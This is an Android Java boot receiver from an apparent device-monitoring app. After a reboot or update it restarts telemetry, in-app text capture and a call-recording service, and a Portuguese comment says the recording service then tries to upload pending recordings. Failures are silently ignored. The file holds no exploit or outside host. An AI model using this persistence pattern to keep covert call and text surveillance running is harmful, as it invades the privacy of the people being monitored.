package com.company.devicemgr.receivers;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

import com.company.devicemgr.services.CallRecorderService;
import com.company.devicemgr.services.ForegroundTelemetryService;
import com.company.devicemgr.utils.InAppTextCaptureManager;
import com.company.devicemgr.utils.AppRuntime;

public class BootReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent == null || intent.getAction() == null) return;

        String action = intent.getAction();
        if (Intent.ACTION_BOOT_COMPLETED.equals(action)
                || Intent.ACTION_MY_PACKAGE_REPLACED.equals(action)
                || "android.intent.action.QUICKBOOT_POWERON".equals(action)) {

            android.content.SharedPreferences sp = context.getSharedPreferences("devicemgr_prefs", Context.MODE_PRIVATE);
            String token = sp.getString("auth_token", null);
            boolean setupCompleted = sp.getBoolean("setup_completed", false);

            if (token != null && token.length() > 10 && setupCompleted) {
                AppRuntime.ensureTelemetryStarted(context);
            } else {
                boolean started = sp.getBoolean("service_started", false);
                if (started) {
                    Intent svc = new Intent(context, ForegroundTelemetryService.class);
                    AppRuntime.startServiceCompat(context, svc, true);
                }
            }

            if (InAppTextCaptureManager.isCaptureEnabled(context)) {
                try {
                    AppRuntime.ensureInAppTextCaptureStarted(context);
                } catch (Exception ignored) {
                }
            }

            // tenta enviar gravações pendentes após reinício
            try {
                AppRuntime.startServiceCompat(context, new Intent(context, CallRecorderService.class), true);
            } catch (Exception ignored) {
            }
        }
    }
}
